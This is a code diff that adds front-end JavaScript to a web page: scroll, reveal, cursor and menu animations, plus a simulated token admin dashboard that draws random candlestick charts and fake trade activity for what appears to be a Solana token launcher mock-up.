+            requestAnimationFrame(() => requestAnimationFrame(() => {
+                document.body.classList.add('loaded');
+            }));
+
+            /* --- Scroll progress bar --- */
+            const bar = document.getElementById('scroll-progress');
+            let ticking = false;
+            function onScroll() {
+                if (ticking) return;
+                ticking = true;
+                requestAnimationFrame(() => {
+                    const max = document.documentElement.scrollHeight - window.innerHeight;
+                    bar.style.transform = `scaleX(${max > 0 ? window.scrollY / max : 0})`;
+                    ticking = false;
+                });
+            }
+            window.addEventListener('scroll', onScroll, { passive: true });
+            onScroll();
+
+            /* --- Reveal on scroll --- */
+            const revealables = document.querySelectorAll('[data-reveal]');
+            if (reduced || !('IntersectionObserver' in window)) {
+                revealables.forEach(el => el.classList.add('revealed'));
+            } else {
+                const revealer = new IntersectionObserver((entries) => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            entry.target.classList.add('revealed');
+                            revealer.unobserve(entry.target);
+                        }
+                    });
+                }, { threshold: 0.12, rootMargin: '0px 0px -8% 0px' });
+                revealables.forEach(el => revealer.observe(el));
+            }
+
+            /* --- Cursor light (desktop, pointer devices only) --- */
+            const glow = document.getElementById('cursor-glow');
+            if (!reduced && window.matchMedia('(hover: hover) and (min-width: 900px)').matches) {
+                let tx = window.innerWidth / 2, ty = window.innerHeight / 2, cx = tx, cy = ty;
+                window.addEventListener('pointermove', (e) => {
+                    tx = e.clientX; ty = e.clientY;
+                    document.body.classList.add('pointer-active');
+                }, { passive: true });
+                (function trail() {
+                    cx += (tx - cx) * 0.08;
+                    cy += (ty - cy) * 0.08;
+                    glow.style.transform = `translate3d(${cx}px, ${cy}px, 0)`;
+                    requestAnimationFrame(trail);
+                })();
+            }
+
+            /* --- Count-up stats --- */
+            function countUp(el) {
+                const target = parseFloat(el.dataset.count);
+                const suffix = el.dataset.suffix || '';
+                if (reduced) { el.textContent = target.toLocaleString() + suffix; return; }
+                const duration = 1600;
+                const start = performance.now();
+                (function step(now) {
+                    const p = Math.min((now - start) / duration, 1);
+                    const eased = 1 - Math.pow(1 - p, 3);
+                    el.textContent = Math.round(target * eased).toLocaleString() + suffix;
+                    if (p < 1) requestAnimationFrame(step);
+                })(start);
+            }
+            const counters = document.querySelectorAll('[data-count]');
+            if ('IntersectionObserver' in window) {
+                const counterObs = new IntersectionObserver((entries) => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            countUp(entry.target);
+                            counterObs.unobserve(entry.target);
+                        }
+                    });
+                }, { threshold: 0.6 });
+                counters.forEach(el => counterObs.observe(el));
+            } else {
+                counters.forEach(countUp);
+            }
+
+            /* --- Mobile menu --- */
+            const toggle = document.getElementById('nav-toggle');
+            const menu = document.getElementById('mobile-menu');
+            function setMenu(open) {
+                document.body.classList.toggle('menu-open', open);
+                toggle.setAttribute('aria-expanded', String(open));
+            }
+            toggle.addEventListener('click', () => setMenu(!document.body.classList.contains('menu-open')));
+            menu.querySelectorAll('a').forEach(a => a.addEventListener('click', () => setMenu(false)));
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') setMenu(false);
+            });
+
+            /* --- Active nav link tracking --- */
+            const navLinks = Array.from(document.querySelectorAll('.nav-links a[href^="#"]'));
+            const sections = navLinks
+                .map(a => document.querySelector(a.getAttribute('href')))
+                .filter(Boolean);
+            if ('IntersectionObserver' in window && sections.length) {
+                const spy = new IntersectionObserver((entries) => {
+                    entries.forEach(entry => {
+                        if (!entry.isIntersecting) return;
+                        navLinks.forEach(a => a.classList.toggle(
+                            'active', a.getAttribute('href') === '#' + entry.target.id
+                        ));
+                    });
+                }, { rootMargin: '-45% 0px -50% 0px' });
+                sections.forEach(s => spy.observe(s));
+            }
+
+            /* --- Magnetic pull on primary buttons --- */
+            if (!reduced && window.matchMedia('(hover: hover) and (min-width: 900px)').matches) {
+                document.querySelectorAll('.hero-actions a').forEach(btn => {
+                    btn.addEventListener('pointermove', (e) => {
+                        const r = btn.getBoundingClientRect();
+                        const dx = (e.clientX - (r.left + r.width / 2)) / r.width;
+                        const dy = (e.clientY - (r.top + r.height / 2)) / r.height;
+                        btn.style.transform = `translate(${dx * 8}px, ${dy * 6 - 2}px)`;
+                    });
+                    btn.addEventListener('pointerleave', () => { btn.style.transform = ''; });
+                });
+            }
+        })();
+    </script>
+
+<script>
+/* ---------- Token Admin Dashboard (simulated) ---------- */
+(function(){
+  var fab = document.getElementById('adminFab');
+  var overlay = document.getElementById('adminOverlay');
+  var closeBtn = document.getElementById('adminClose');
+  if(!fab || !overlay) return;
+
+  var state = {
+    price: 0.00002754,
+    base: 0.00002754,
+    liq: 5.00,
+    holders: 1,
+    mcap: 27500,
+    supply: 1000000000,
+    tf: '5m',
+    candles: [],   // {o,h,l,c}
+    tradeTimer: null,
+    chartTimer: null
+  };
+
+  function fmtPrice(p){
+    if(p >= 1) return '$' + p.toFixed(4);
+    if(p >= 0.01) return '$' + p.toFixed(6);
+    return '$' + p.toFixed(8);
+  }
+  function fmtMcap(v){
+    if(v >= 1e6) return '$' + (v/1e6).toFixed(2) + 'M';
+    if(v >= 1e3) return '$' + (v/1e3).toFixed(1) + 'K';
+    return '$' + Math.round(v);
+  }
+  function pct(from, to){
+    return ((to - from) / from) * 100;
+  }
+
+  /* ---- OHLC candle generation ---- */
+  function makeCandle(prevClose){
+    var open = prevClose;
+    var drift = (Math.random() - 0.48) * 0.045;
+    var close = open * (1 + drift);
+    var wickUp = Math.random() * 0.018;
+    var wickDn = Math.random() * 0.018;
+    var high = Math.max(open, close) * (1 + wickUp);
+    var low  = Math.min(open, close) * (1 - wickDn);
+    // rare long wick
+    if(Math.random() > 0.88) high *= 1 + Math.random() * 0.025;
+    if(Math.random() > 0.88) low  *= 1 - Math.random() * 0.025;
+    if(low < state.base * 0.35) low = state.base * 0.35;
+    if(high > state.base * 4) high = state.base * 4;
+    if(close < low) close = low;
+    if(close > high) close = high;
+    return { o: open, h: high, l: low, c: close };
+  }
+
+  function seedCandles(){
+    state.candles = [];
+    var p = state.base * (0.75 + Math.random() * 0.2);
+    var count = 36;
+    for(var i = 0; i < count; i++){
+      var c = makeCandle(p);
+      state.candles.push(c);
+      p = c.c;
+    }
+    state.price = state.candles[state.candles.length - 1].c;
+    state.mcap = state.price * state.supply;
+  }
+
+  function pushCandle(){
+    var last = state.candles[state.candles.length - 1];
+    var c = makeCandle(last ? last.c : state.price);
+    state.candles.push(c);
+    if(state.candles.length > 36) state.candles.shift();
+    state.price = c.c;
+    state.mcap = state.price * state.supply;
+  }
+
+  /* ---- Draw candlestick chart ---- */
+  function drawChart(){
+    var canvas = document.getElementById('adminChart');
+    if(!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var dpr = window.devicePixelRatio || 1;
+    var w = canvas.clientWidth || 560;
+    var h = 180;
+    canvas.width = Math.floor(w * dpr);
+    canvas.height = Math.floor(h * dpr);
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    ctx.clearRect(0, 0, w, h);
+
+    var data = state.candles;
+    if(!data.length) return;
+
+    var min = Infinity, max = -Infinity;
+    for(var i = 0; i < data.length; i++){
+      if(data[i].l < min) min = data[i].l;
+      if(data[i].h > max) max = data[i].h;
+    }
+    var pad = (max - min) * 0.1 || max * 0.05;
+    min -= pad; max += pad;
+    var range = max - min || 1;
+
+    function yOf(v){ return h - ((v - min) / range) * (h - 12) - 6; }
+
+    // horizontal grid
+    ctx.strokeStyle = 'rgba(255,255,255,0.045)';
+    ctx.lineWidth = 1;
+    for(var g = 1; g < 4; g++){
+      var gy = (h / 4) * g;
+      ctx.beginPath(); ctx.moveTo(0, gy); ctx.lineTo(w, gy); ctx.stroke();
+    }
+
+    var n = data.length;
+    var slot = w / n;
+    var bodyW = Math.max(3, Math.min(11, slot * 0.55));
+
+    for(var i = 0; i < n; i++){
+      var c = data[i];
+      var x = slot * i + slot / 2;
+      var yO = yOf(c.o);
+      var yC = yOf(c.c);
+      var yH = yOf(c.h);
+      var yL = yOf(c.l);
+      var bull = c.c >= c.o;
+      var col = bull ? '#37d67a' : '#ff5c5c';
+
+      // wick
+      ctx.strokeStyle = col;
+      ctx.lineWidth = 1.25;
+      ctx.beginPath();
+      ctx.moveTo(x, yH);
+      ctx.lineTo(x, yL);
+      ctx.stroke();
+
+      // body
+      var top = Math.min(yO, yC);
+      var bot = Math.max(yO, yC);
+      var bh = Math.max(1.5, bot - top);
+      ctx.fillStyle = col;
+      // hollow-ish for bull (optional solid both for clarity)
+      if(bull){
+        ctx.globalAlpha = 0.95;
+        ctx.fillRect(x - bodyW / 2, top, bodyW, bh);
+        ctx.globalAlpha = 1;
+      } else {
+        ctx.fillRect(x - bodyW / 2, top, bodyW, bh);
+      }
+    }
+  }
+
+  function renderStats(){
+    var first = state.candles[0] ? state.candles[0].o : state.price;
+    var ch = pct(first, state.price);
+    var up = ch >= 0;
+    var chStr = (up ? '+' : '') + ch.toFixed(1) + '%';
+
+    document.getElementById('adPrice').textContent = fmtPrice(state.price);
+    document.getElementById('adChartPrice').textContent = fmtPrice(state.price);
+    document.getElementById('adMcap').textContent = fmtMcap(state.mcap);
+    document.getElementById('adLiq').textContent = state.liq.toFixed(2) + ' SOL';
+    document.getElementById('adHolders').textContent = String(state.holders);
+
+    ['adPriceChg','adMcapChg','adChartChg'].forEach(function(id){
+      var el = document.getElementById(id);
+      if(!el) return;
+      el.textContent = id === 'adChartChg' ? chStr + ' · ' + state.tf : chStr;
+      el.classList.toggle('up', up);
+      el.classList.toggle('dn', !up);
+    });
+  }
+
+  function addTrade(side, sol){
+    var box = document.getElementById('adminTrades');
+    if(!box) return;
+    var row = document.createElement('div');
+    row.className = 'admin-trade';
+    var wallet = Math.random().toString(36).slice(2,6) + '…' + Math.random().toString(36).slice(2,6);
+    row.innerHTML =
+      '<span class="' + (side === 'buy' ? 'side-b' : 'side-s') + '">' + (side === 'buy' ? 'BUY' : 'SELL') + '</span>' +
+      '<span class="amt">' + sol.toFixed(2) + ' SOL</span>' +
+      '<span class="ago">' + wallet + '</span>';
+    box.insertBefore(row, box.firstChild);
+    while(box.children.length > 8) box.removeChild(box.lastChild);
+  }
+
+  function simToast(msg){
+    var t = document.getElementById('adminSimToast');
+    if(!t) return;
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(simToast._tm);
+    simToast._tm = setTimeout(function(){ t.classList.remove('show'); }, 2200);
+  }
+
+  function syncFromForm(){
+    var nameEl = document.getElementById('token-name');
+    var symEl = document.getElementById('token-symbol');
+    var name = (nameEl && nameEl.value.trim()) || 'Wire Token';
+    var sym = (symEl && symEl.value.trim().toUpperCase()) || 'WIRE';
+    var titleIn = document.getElementById('adminTitleInput');
+    var symIn = document.getElementById('adminSymInput');
+    if(titleIn) titleIn.value = name;
+    if(symIn) symIn.value = sym;
+    document.getElementById('adminAv').textContent = name.charAt(0).toUpperCase();
+  }
+
+  function applyEdits(){
+    var titleIn = document.getElementById('adminTitleInput');
+    var symIn = document.getElementById('adminSymInput');
+    var name = (titleIn && titleIn.value.trim()) || 'Wire Token';
+    var sym = (symIn && symIn.value.trim().toUpperCase()) || 'WIRE';
+    if(symIn) symIn.value = sym.replace(/[^A-Z0-9]/g,'').slice(0,10);
+    document.getElementById('adminAv').textContent = name.charAt(0).toUpperCase();
+
+    // mirror back to launcher form if present
+    var nameEl = document.getElementById('token-name');
+    var symEl = document.getElementById('token-symbol');
+    if(nameEl) nameEl.value = name;
+    if(symEl) symEl.value = symIn ? symIn.value : sym;
+    if(typeof updatePreview === 'function'){
+      try{ updatePreview(); }catch(e){}
+    }
+  }
+
+  function openAdmin(){
+    syncFromForm();
+
+    var burn = document.getElementById('burn-lp');
+    var lpBadge = document.getElementById('adLpBadge');
+    if(lpBadge){
+      if(burn && burn.checked){ lpBadge.textContent = 'burned'; lpBadge.className = 'admin-badge ok'; }
+      else { lpBadge.textContent = 'locked'; lpBadge.className = 'admin-badge ok'; }
+    }
+
+    seedCandles();
+    renderStats();
+    drawChart();
+    document.getElementById('adminTrades').innerHTML = '';
+    addTrade('buy', 0.42);
+    addTrade('buy', 1.10);
+    addTrade('sell', 0.18);
+
+    overlay.classList.add('open');
+    document.body.style.overflow = 'hidden';
+
+    clearInterval(state.chartTimer);
+    clearInterval(state.tradeTimer);
+    state.chartTimer = setInterval(function(){
+      pushCandle();
+      renderStats();
+      drawChart();
+    }, 1100);
+    state.tradeTimer = setInterval(function(){
+      var side = Math.random() > 0.45 ? 'buy' : 'sell';
+      var sol = Math.random() * 2.4 + 0.05;
+      addTrade(side, sol);
+      if(side === 'buy' && Math.random() > 0.7) state.holders += 1;
+      // nudge last candle close
+      var last = state.candles[state.candles.length - 1];
+      if(last){
+        var factor = side === 'buy' ? (1 + Math.random() * 0.012) : (1 - Math.random() * 0.01);
+        last.c *= factor;
+        if(last.c > last.h) last.h = last.c;
+        if(last.c < last.l) last.l = last.c;
+        state.price = last.c;
+        state.mcap = state.price * state.supply;
+      }
+      renderStats();
+      drawChart();
+    }, 2800);
+  }
+
+  function closeAdmin(){
+    applyEdits();
+    overlay.classList.remove('open');
+    document.body.style.overflow = '';
+    clearInterval(state.chartTimer);
+    clearInterval(state.tradeTimer);
+  }
+
+  fab.addEventListener('click', openAdmin);
+  closeBtn.addEventListener('click', closeAdmin);
+  overlay.addEventListener('click', function(e){ if(e.target === overlay) closeAdmin(); });
+  document.addEventListener('keydown', function(e){
+    if(e.key === 'Escape' && overlay.classList.contains('open')) closeAdmin();
+  });
+
+  // live edit name / symbol
+  var titleIn = document.getElementById('adminTitleInput');
+  var symIn = document.getElementById('adminSymInput');
+  if(titleIn){
+    titleIn.addEventListener('input', function(){
+      document.getElementById('adminAv').textContent = (this.value.trim() || 'W').charAt(0).toUpperCase();
+    });
+    titleIn.addEventListener('change', applyEdits);
+  }
+  if(symIn){
+    symIn.addEventListener('input', function(){
+      this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,10);
+    });
+    symIn.addEventListener('change', applyEdits);
+  }
+
+  document.getElementById('adminTf').addEventListener('click', function(e){
+    var b = e.target.closest('button[data-tf]');
+    if(!b) return;
+    state.tf = b.dataset.tf;
+    Array.prototype.forEach.call(document.querySelectorAll('#adminTf button'), function(x){
+      x.classList.toggle('on', x === b);
+    });
+    // different volatility by timeframe feel
+    if(state.tf === '1m') state.base = state.price;
+    seedCandles();
+    renderStats();
+    drawChart();
+  });
+
+  document.querySelectorAll('.admin-act[data-act]').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var act = btn.dataset.act;
+      var last = state.candles[state.candles.length - 1];
+      if(act === 'buy'){
+        state.price *= 1 + (0.02 + Math.random() * 0.04);
+        state.holders += Math.floor(Math.random() * 3) + 1;
+        state.liq += 0.15 + Math.random() * 0.4;
+        addTrade('buy', 0.5 + Math.random() * 1.5);
+        simToast('Simulated buy · position increased');
+      } else if(act === 'sell'){
+        state.price *= 1 - (0.03 + Math.random() * 0.05);
+        state.liq = Math.max(0.5, state.liq - 0.3);
+        addTrade('sell', 0.8 + Math.random() * 2);
+        simToast('Simulated sell all · position closed');
+      } else if(act === 'boost'){
+        state.liq += 1 + Math.random() * 2;
+        state.price *= 1.01;
+        simToast('Liquidity boosted · +' + (1 + Math.random()).toFixed(2) + ' SOL');
+      } else if(act === 'remove'){
+        simToast('DEX listing paused (simulation)');
+      } else if(act === 'burn'){
+        var badge = document.getElementById('adLpBadge');
+        if(badge){ badge.textContent = 'burned'; badge.className = 'admin-badge ok'; }
+        simToast('LP tokens burned · liquidity locked');
+      } else if(act === 'airdrop'){
+        state.holders += Math.floor(Math.random() * 12) + 5;
+        simToast('Airdrop queued to ' + state.holders + ' holders');
+      }
+      if(last){
+        last.c = state.price;
+        if(last.c > last.h) last.h = last.c;
+        if(last.c < last.l) last.l = last.c;
+      }
+      state.mcap = state.price * state.supply;
+      renderStats();
+      drawChart();
+    });
+  });
+
+  window.addEventListener('resize', function(){
+    if(overlay.classList.contains('open')) drawChart();
+  });
+})();
+</script>
+
+
 </body>
 </html>
